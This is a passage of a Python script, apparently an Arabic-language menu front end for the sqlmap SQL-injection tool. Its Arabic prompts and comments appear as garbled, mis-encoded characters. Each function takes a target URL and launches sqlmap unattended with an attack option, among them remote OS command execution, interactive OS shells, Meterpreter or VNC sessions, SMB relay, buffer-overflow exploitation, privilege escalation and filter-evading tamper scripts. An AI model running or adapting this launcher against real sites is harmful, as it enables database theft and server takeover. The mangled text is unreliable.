        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "--skip-urlencode", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪о╪╖┘К ╪к╪▒┘Е┘К╪▓ URL.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪╣┘К┘К┘Ж ┘Е╪╣╪з┘Е┘Д CSRF token
def csrf_token():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        token = i("╪г╪п╪о┘Д ╪з╪│┘Е ┘Е╪╣╪з┘Е┘Д CSRF token: ")
        cmd = ["sqlmap", "-u", target_url, f"--csrf-token={token}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪╣┘К┘К┘Ж CSRF token.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪╣┘К┘К┘Ж ╪▒╪з╪и╪╖ ╪з╪│╪к╪о╪▒╪з╪м CSRF token
def csrf_url():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        csrf_url = i("╪г╪п╪о┘Д ╪▒╪з╪и╪╖ ╪з╪│╪к╪о╪▒╪з╪м CSRF token: ")
        cmd = ["sqlmap", "-u", target_url, f"--csrf-url={csrf_url}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪╣┘К┘К┘Ж ╪▒╪з╪и╪╖ CSRF.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪╣┘К┘К┘Ж ╪╖╪▒┘К┘В╪й ╪з╪│╪к╪о╪▒╪з╪м CSRF token (GET, POST, ...)
def csrf_method():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        method = i("╪г╪п╪о┘Д ╪╖╪▒┘К┘В╪й ╪з╪│╪к╪о╪▒╪з╪м CSRF token (GET, POST, ...): ")
        cmd = ["sqlmap", "-u", target_url, f"--csrf-method={method}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪╣┘К┘К┘Ж ╪╖╪▒┘К┘В╪й ╪з╪│╪к╪о╪▒╪з╪м CSRF.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪╣╪п╪п ┘Е╪н╪з┘И┘Д╪з╪к ╪з╪│╪к╪о╪▒╪з╪м CSRF token
def csrf_retries():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        retries = i("╪г╪п╪о┘Д ╪╣╪п╪п ┘Е╪н╪з┘И┘Д╪з╪к ╪з╪│╪к╪о╪▒╪з╪м CSRF token (╪з┘Д╪з┘Б╪к╪▒╪з╪╢┘К 0): ")
        if not retries.strip():
            retries = "0"
        cmd = ["sqlmap", "-u", target_url, f"--csrf-retries={retries}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪╣┘К┘К┘Ж ╪╣╪п╪п ┘Е╪н╪з┘И┘Д╪з╪к CSRF.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪е╪м╪и╪з╪▒ ╪з╪│╪к╪о╪п╪з┘Е HTTPS/SSL
def force_ssl():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "--force-ssl", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ┘Б╪▒╪╢ ╪з╪│╪к╪о╪п╪з┘Е SSL.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪з╪│╪к╪о╪п╪з┘Е ╪╖┘Д╪и╪з╪к HTTP chunked ┘Е╪┤┘Б╪▒╪й (POST)
def chunked():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "--chunked", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к┘Б╪╣┘К┘Д HTTP chunked.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪з╪│╪к╪о╪п╪з┘Е ╪╖╪▒┘К┘В╪й HTTP parameter pollution
def hpp():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "--hpp", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к┘Б╪╣┘К┘Д HTTP parameter pollution.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к┘Ж┘Б┘К╪░ ┘Г┘И╪п Python ┘В╪и┘Д ╪з┘Д╪╖┘Д╪и
def eval_code():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        code = i("╪г╪п╪о┘Д ┘Г┘И╪п Python ┘Д┘Д╪к┘Ж┘Б┘К╪░ ┘В╪и┘Д ╪з┘Д╪╖┘Д╪и: ")
        cmd = ["sqlmap", "-u", target_url, f"--eval={code}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к┘Ж┘Б┘К╪░ ┘Г┘И╪п Python.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪н╪п┘К╪п ╪з┘Д┘Е╪╣╪з┘Е┘Д╪з╪к ╪з┘Д╪к┘К ╪│┘К╪к┘Е ╪з╪о╪к╪и╪з╪▒┘З╪з
def set_test_param():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        params = i("╪г╪п╪о┘Д ╪з┘Д┘Е╪╣╪з┘Е┘Д╪з╪к ╪з┘Д╪к┘К ╪к╪▒┘К╪п ╪з╪о╪к╪и╪з╪▒┘З╪з (┘Е╪л┘Д╪з┘Л: id,user): ")
        cmd = ["sqlmap", "-u", target_url, "-p", params, "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪н╪п┘К╪п ┘Е╪╣╪з┘Е┘Д╪з╪к ╪з┘Д╪з╪о╪к╪и╪з╪▒.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪о╪╖┘К ╪з╪о╪к╪и╪з╪▒ ┘Е╪╣╪з┘Е┘Д╪з╪к ┘Е╪╣┘К┘Ж╪й
def skip_params():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        skip_params = i("╪г╪п╪о┘Д ╪з┘Д┘Е╪╣╪з┘Е┘Д╪з╪к ╪з┘Д╪к┘К ╪к╪▒┘К╪п ╪к╪о╪╖┘К ╪з╪о╪к╪и╪з╪▒┘З╪з (┘Е╪л┘Д╪з┘Л: token,session): ")
        cmd = ["sqlmap", "-u", target_url, f"--skip={skip_params}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪о╪╖┘К ┘Е╪╣╪з┘Е┘Д╪з╪к ┘Е╪╣┘К┘Ж╪й.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪о╪╖┘К ╪з╪о╪к╪и╪з╪▒ ╪з┘Д┘Е╪╣╪з┘Е┘Д╪з╪к ╪з┘Д╪л╪з╪и╪к╪й (╪║┘К╪▒ ╪з┘Д┘Е╪к╪║┘К╪▒╪й)
def skip_static_params():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "--skip-static", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪о╪╖┘К ┘Е╪╣╪з┘Е┘Д╪з╪к ╪л╪з╪и╪к╪й.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪з╪│╪к╪и╪╣╪з╪п ┘Е╪╣╪з┘Е┘Д╪з╪к ╪н╪│╪и ┘Ж┘Е╪╖ ┘Е╪╣┘К┘Ж (Regex)
def param_exclude():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        regex = i("╪г╪п╪о┘Д ╪к╪╣╪и┘К╪▒ Regex ┘Д╪з╪│╪к╪и╪╣╪з╪п ┘Е╪╣╪з┘Е┘Д╪з╪к ┘Е╪╣┘К┘Ж╪й (┘Е╪л┘Д╪з┘Л: ses): ")
        cmd = ["sqlmap", "-u", target_url, f"--param-exclude={regex}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪з╪│╪к╪и╪╣╪з╪п ┘Е╪╣╪з┘Е┘Д╪з╪к ╪и┘Ж┘Е╪╖ ┘Е╪╣┘К┘Ж.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪з╪о╪к┘К╪з╪▒ ┘Е╪╣╪з┘Е┘Д╪з╪к ╪н╪│╪и ┘Е┘Г╪з┘Ж┘З╪з (┘Е╪л┘Д╪з┘Л: POST, GET)
def param_filter():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        place = i("╪г╪п╪о┘Д ┘Е┘Г╪з┘Ж ╪з┘Д┘Е╪╣╪з┘Е┘Д╪з╪к ╪з┘Д┘Е╪▒╪з╪п ╪з╪о╪к╪и╪з╪▒┘З╪з (┘Е╪л┘Д╪з┘Л: POST): ")
        cmd = ["sqlmap", "-u", target_url, f"--param-filter={place}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪╡┘Б┘К╪й ╪з┘Д┘Е╪╣╪з┘Е┘Д╪з╪к ╪н╪│╪и ╪з┘Д┘Е┘Г╪з┘Ж.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ┘Б╪▒╪╢ ┘Ж┘И╪╣ ┘В╪з╪╣╪п╪й ╪з┘Д╪и┘К╪з┘Ж╪з╪к (DBMS)
def force_dbms():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        dbms = i("╪г╪п╪о┘Д ┘Ж┘И╪╣ ┘В╪з╪╣╪п╪й ╪з┘Д╪и┘К╪з┘Ж╪з╪к (┘Е╪л┘Д╪з┘Л: MySQL, PostgreSQL): ")
        cmd = ["sqlmap", "-u", target_url, f"--dbms={dbms}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ┘Б╪▒╪╢ ┘Ж┘И╪╣ ┘В╪з╪╣╪п╪й ╪з┘Д╪и┘К╪з┘Ж╪з╪к.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪е╪╢╪з┘Б╪й ╪и┘К╪з┘Ж╪з╪к ╪з╪╣╪к┘Е╪з╪п ┘Д┘В╪з╪╣╪п╪й ╪з┘Д╪и┘К╪з┘Ж╪з╪к
def dbms_credentials():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        creds = i("╪г╪п╪о┘Д ╪и┘К╪з┘Ж╪з╪к ╪з╪╣╪к┘Е╪з╪п ┘В╪з╪╣╪п╪й ╪з┘Д╪и┘К╪з┘Ж╪з╪к (user:password): ")
        cmd = ["sqlmap", "-u", target_url, f"--dbms-cred={creds}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪е╪╢╪з┘Б╪й ╪и┘К╪з┘Ж╪з╪к ╪з╪╣╪к┘Е╪з╪п ┘В╪з╪╣╪п╪й ╪з┘Д╪и┘К╪з┘Ж╪з╪к.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ┘Б╪▒╪╢ ┘Ж╪╕╪з┘Е ╪к╪┤╪║┘К┘Д ┘В╪з╪╣╪п╪й ╪з┘Д╪и┘К╪з┘Ж╪з╪к
def force_os():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        os_name = i("╪г╪п╪о┘Д ┘Ж╪╕╪з┘Е ╪з┘Д╪к╪┤╪║┘К┘Д ╪з┘Д┘Е┘Б╪▒┘И╪╢ ┘Д┘В╪з╪╣╪п╪й ╪з┘Д╪и┘К╪з┘Ж╪з╪к (┘Е╪л┘Д╪з┘Л: Windows, Linux): ")
        cmd = ["sqlmap", "-u", target_url, f"--os={os_name}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ┘Б╪▒╪╢ ┘Ж╪╕╪з┘Е ╪к╪┤╪║┘К┘Д ┘В╪з╪╣╪п╪й ╪з┘Д╪и┘К╪з┘Ж╪з╪к.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪з╪│╪к╪о╪п╪з┘Е ╪г╪▒┘В╪з┘Е ┘Г╪и┘К╪▒╪й ┘Г┘В┘К┘Е ┘Д╪з╪║┘К╪й ┘Д┘Д╪з╪о╪к╪и╪з╪▒
def invalid_bignum():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "--invalid-bignum", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к┘Б╪╣┘К┘Д invalid-bignum.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪з╪│╪к╪о╪п╪з┘Е ╪╣┘Е┘Д┘К╪з╪к ┘Е┘Ж╪╖┘В┘К╪й ┘Г┘В┘К┘Е ┘Д╪з╪║┘К╪й ┘Д┘Д╪з╪о╪к╪и╪з╪▒
def invalid_logical():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "--invalid-logical", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к┘Б╪╣┘К┘Д invalid-logical.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪з╪│╪к╪о╪п╪з┘Е ╪│┘Д╪з╪│┘Д ╪╣╪┤┘И╪з╪ж┘К╪й ┘Г┘В┘К┘Е ┘Д╪з╪║┘К╪й ┘Д┘Д╪з╪о╪к╪и╪з╪▒
def invalid_string():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "--invalid-string", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к┘Б╪╣┘К┘Д invalid-string.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪╣╪╖┘К┘Д ┘Е┘К┘Г╪з┘Ж┘К┘Г┘К╪й ╪к╪н┘И┘К┘Д ╪г┘Ж┘И╪з╪╣ ╪з┘Д╪и┘К╪з┘Ж╪з╪к ┘Б┘К ╪з┘Д╪н┘Е┘И┘Д╪й
def no_cast():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "--no-cast", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪╣╪╖┘К┘Д ╪к╪н┘И┘К┘Д ╪г┘Ж┘И╪з╪╣ ╪з┘Д╪и┘К╪з┘Ж╪з╪к.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪╣╪╖┘К┘Д ╪в┘Д┘К╪й ╪з┘Д┘З╪▒┘И╪и ┘Д┘Д╪│┘Д╪з╪│┘Д ╪з┘Д┘Ж╪╡┘К╪й ┘Б┘К ╪з┘Д╪н┘Е┘И┘Д╪й
def no_escape():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "--no-escape", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪╣╪╖┘К┘Д ╪з┘Д┘З╪▒┘И╪и ┘Д┘Д╪│┘Д╪з╪│┘Д ╪з┘Д┘Ж╪╡┘К╪й.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪е╪╢╪з┘Б╪й ╪и╪з╪п╪ж╪й ┘Д┘Д╪н┘Е┘И┘Д╪й
def prefix_payload():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        prefix = i("╪г╪п╪о┘Д ╪и╪з╪п╪ж╪й ┘Д┘Д╪н┘Е┘И┘Д╪й: ")
        cmd = ["sqlmap", "-u", target_url, f"--prefix={prefix}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪е╪╢╪з┘Б╪й ╪и╪з╪п╪ж╪й ┘Д┘Д╪н┘Е┘И┘Д╪й.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪е╪╢╪з┘Б╪й ┘Д╪з╪н┘В╪й ┘Д┘Д╪н┘Е┘И┘Д╪й
def suffix_payload():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        suffix = i("╪г╪п╪о┘Д ┘Д╪з╪н┘В╪й ┘Д┘Д╪н┘Е┘И┘Д╪й: ")
        cmd = ["sqlmap", "-u", target_url, f"--suffix={suffix}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪е╪╢╪з┘Б╪й ┘Д╪з╪н┘В╪й ┘Д┘Д╪н┘Е┘И┘Д╪й.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪з╪│╪к╪о╪п╪з┘Е ╪│┘Г╪▒┘К╪и╪к╪з╪к ╪к┘Д╪з╪╣╪и ┘Е╪о╪╡╪╡╪й ╪╣┘Д┘Й ╪и┘К╪з┘Ж╪з╪к ╪з┘Д╪н┘Е┘И┘Д╪й
def tamper_scripts():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        scripts = i("╪г╪п╪о┘Д ╪г╪│┘Е╪з╪б ╪│┘Г╪▒┘К╪и╪к╪з╪к ╪з┘Д╪к┘Д╪з╪╣╪и (┘Е┘Б╪╡┘И┘Д╪й ╪и┘Б┘И╪з╪╡┘Д ╪е╪░╪з ╪г┘Г╪л╪▒ ┘Е┘Ж ┘И╪з╪н╪п╪й): ")
        cmd = ["sqlmap", "-u", target_url, f"--tamper={scripts}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪з╪│╪к╪о╪п╪з┘Е ╪│┘Г╪▒┘К╪и╪к╪з╪к ╪з┘Д╪к┘Д╪з╪╣╪и.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к┘Ж┘Б┘К╪░ ╪г┘Е╪▒ ┘Ж╪╕╪з┘Е ╪к╪┤╪║┘К┘Д ┘Е╪╣┘К┘Ж
def os_cmd():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        os_command = i("╪г╪п╪о┘Д ╪г┘Е╪▒ ┘Ж╪╕╪з┘Е ╪з┘Д╪к╪┤╪║┘К┘Д ┘Д┘Д╪к┘Ж┘Б┘К╪░: ")
        cmd = ["sqlmap", "-u", target_url, f"--os-cmd={os_command}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к┘Ж┘Б┘К╪░ ╪г┘Е╪▒ ┘Ж╪╕╪з┘Е ╪з┘Д╪к╪┤╪║┘К┘Д.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ┘Б╪к╪н ╪┤┘Д ╪к┘Б╪з╪╣┘Д┘К ┘Д┘Ж╪╕╪з┘Е ╪з┘Д╪к╪┤╪║┘К┘Д
def os_shell():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "--os-shell", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ┘Б╪к╪н ╪з┘Д╪┤┘Д ╪з┘Д╪к┘Б╪з╪╣┘Д┘К ┘Д┘Ж╪╕╪з┘Е ╪з┘Д╪к╪┤╪║┘К┘Д.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ┘Б╪к╪н ╪┤┘Д ╪о╪з╪▒╪м┘К (OOB shell╪М Meterpreter ╪г┘И VNC)
def os_pwn():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "--os-pwn", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ┘Б╪к╪н ╪┤┘Д ╪о╪з╪▒╪м┘К.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к┘Ж┘Б┘К╪░ ┘З╪м┘Е╪й ╪е╪╣╪з╪п╪й ╪к┘И╪м┘К┘З SMB (os-smbrelay)
def os_smbrelay():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "--os-smbrelay", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к┘Ж┘Б┘К╪░ ┘З╪м┘Е╪й SMB relay.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪з╪│╪к╪║┘Д╪з┘Д ╪л╪║╪▒╪й overflow ┘Б┘К ╪з┘Д╪░╪з┘Г╪▒╪й ╪з┘Д┘Е╪д┘В╪к╪й (buffer overflow) ┘Б┘К ╪з┘Д╪е╪м╪▒╪з╪б╪з╪к ╪з┘Д┘Е╪о╪▓┘Ж╪й
def os_bof():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "--os-bof", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪з╪│╪к╪║┘Д╪з┘Д ╪л╪║╪▒╪й buffer overflow.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ┘Е╪н╪з┘И┘Д╪й ╪▒┘Б╪╣ ╪╡┘Д╪з╪н┘К╪з╪к ┘Е╪│╪к╪о╪п┘Е ┘В╪з╪╣╪п╪й ╪з┘Д╪и┘К╪з┘Ж╪з╪к
def priv_esc():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "--priv-esc", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ┘Е╪н╪з┘И┘Д╪й ╪▒┘Б╪╣ ╪з┘Д╪╡┘Д╪з╪н┘К╪з╪к.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪н╪п┘К╪п ┘Е╪│╪з╪▒ ╪к╪л╪и┘К╪к ╪е╪╖╪з╪▒ ╪╣┘Е┘Д Metasploit ┘Е╪н┘Д┘К┘Л╪з
def msf_path():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        path = i("╪г╪п╪о┘Д ╪з┘Д┘Е╪│╪з╪▒ ╪з┘Д┘Е╪н┘Д┘К ┘Д╪е╪╖╪з╪▒ ╪╣┘Е┘Д Metasploit: ")
        cmd = ["sqlmap", "-u", target_url, f"--msf-path={path}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪н╪п┘К╪п ┘Е╪│╪з╪▒ Metasploit.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪н╪п┘К╪п ╪з┘Д┘Е╪│╪з╪▒ ╪з┘Д┘Е╪д┘В╪к ┘Д┘Е┘Д┘Б╪з╪к ╪з┘Д┘Ж╪╕╪з┘Е ╪╣┘Ж ╪и┘П╪╣╪п
def tmp_path():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        path = i("╪г╪п╪о┘Д ╪з┘Д┘Е╪│╪з╪▒ ╪з┘Д┘Е╪д┘В╪к ┘Д┘Д┘Е┘Д┘Б╪з╪к ╪╣┘Д┘Й ╪з┘Д┘Ж╪╕╪з┘Е ╪з┘Д┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, f"--tmp-path={path}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪н╪п┘К╪п ╪з┘Д┘Е╪│╪з╪▒ ╪з┘Д┘Е╪д┘В╪к.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪н┘Е┘К┘Д ╪м┘Д╪│╪й ┘Е╪о╪▓┘Ж╪й ┘Е┘Ж ┘Е┘Д┘Б sqlite
def load_session():
    try:
        session_file = i("╪г╪п╪о┘Д ┘Е╪│╪з╪▒ ┘Е┘Д┘Б ╪з┘Д╪м┘Д╪│╪й (.sqlite): ")
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "-s", session_file, "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪н┘Е┘К┘Д ╪з┘Д╪м┘Д╪│╪й.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪│╪м┘К┘Д ╪н╪▒┘Г╪й HTTP ┘Б┘К ┘Е┘Д┘Б ┘Ж╪╡┘К
def log_http_traffic():
    try:
        traffic_file = i("╪г╪п╪о┘Д ╪з╪│┘Е ┘Е┘Д┘Б ╪к╪│╪м┘К┘Д ╪н╪▒┘Г╪й HTTP: ")
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "-t", traffic_file, "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪│╪м┘К┘Д ╪н╪▒┘Г╪й HTTP.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

